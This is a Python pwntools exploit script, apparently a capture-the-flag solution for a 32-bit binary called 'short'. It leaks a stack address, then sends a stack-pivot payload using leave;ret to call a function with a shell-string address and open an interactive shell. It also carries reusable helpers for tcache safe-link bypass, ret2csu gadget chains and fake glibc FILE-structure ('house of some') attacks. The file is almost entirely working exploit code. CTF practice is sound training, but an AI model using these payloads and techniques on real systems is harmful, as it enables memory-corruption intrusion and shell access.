from pwn import *
arch = "i386"
log_level = "debug"
remote_ip = "0192d5ce263f7df88414df6bb978d412.komj.dg03.ciihw.cn"
remote_port = "46354"
# libc_path = "./libc.so.6"
elf_path = "./short"

context.arch  = arch
context.log_level = log_level
context.terminal =['tmux','splitw','-h']
exe = ELF(elf_path)
# libc = ELF(libc_path)

p = process(elf_path)
# p = remote(remote_ip,remote_port)

def dbg():
    gdb.attach(p)
    pause()

def cmd(i, prompt=b""):
    pass

def add():
    pass

def delete(index):
    pass

def edit(index, payload):
    pass

def show(index):
    pass

def tcache_safelink(target_addr, tcache_addr):
    return target_addr ^ (tcache_addr >> 12)

def csu_gadget(part1, part2, jmp2, arg1 = 0, arg2 = 0, arg3 = 0):
    payload = p64(part1)    # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += p64(0)    # rbx be 0x0
    payload += p64(1)    # rbp be 0x1
    payload += p64(jmp2)    # r12 jump to
    payload += p64(arg3)    # r13 -> rdx    arg3
    payload += p64(arg2)    # r14 -> rsi    arg2
    payload += p64(arg1)    # r15 -> edi    arg1
    payload += p64(part2)    # part2 entry will call [r12 + rbx * 0x8]
    payload += b'A' * 56    # junk 6 * 8 + 8 = 56
    return payload

def house_of_some_read(read_from, len, _chain):
    fake_IO_FILE = IO_FILE_plus_struct()
    fake_IO_FILE.flags = 0x8000 | 0x40 | 0x1000
    fake_IO_FILE.fileno = 0
    fake_IO_FILE._mode = 0
    fake_IO_FILE._IO_write_base = read_from
    fake_IO_FILE._IO_write_ptr = read_from+len
    fake_IO_FILE.chain = _chain
    fake_IO_FILE.vtable = libc.sym['_IO_file_jumps'] - 0x8
    return bytes(fake_IO_FILE)

def house_of_some_write(write_from, len, _chain):
    fake_IO_FILE = IO_FILE_plus_struct()
    fake_IO_FILE.flags = 0x8000 | 0x800 | 0x1000
    fake_IO_FILE.fileno = 1
    fake_IO_FILE._mode = 0
    fake_IO_FILE._IO_write_base = write_from
    fake_IO_FILE._IO_write_ptr = write_from + len
    fake_IO_FILE.chain = _chain
    fake_IO_FILE.vtable = libc.sym['_IO_file_jumps']
    return bytes(fake_IO_FILE)

p.sendlineafter("Enter your username: ", "admin")
p.sendlineafter("Enter your password: ","admin123")

p.recvuntil("You will input this: ")
stack_addr = int(p.recvline()[:-1], 16)
success(hex(stack_addr))
sh_addr = 0x804A038 
leave_ret = 0x08048674
gift_addr = 0x80485E6
gdb.attach(p)
payload = flat(
    gift_addr,
    0xdeadbeef,
    sh_addr
).ljust(80,b'a') + p32(stack_addr -0x4) + p32(leave_ret) 


p.sendafter(b"plz input your msg:",payload)
# libc_base =leak_libc - 0x732a0
# success(hex(libc_base))





p.interactive()

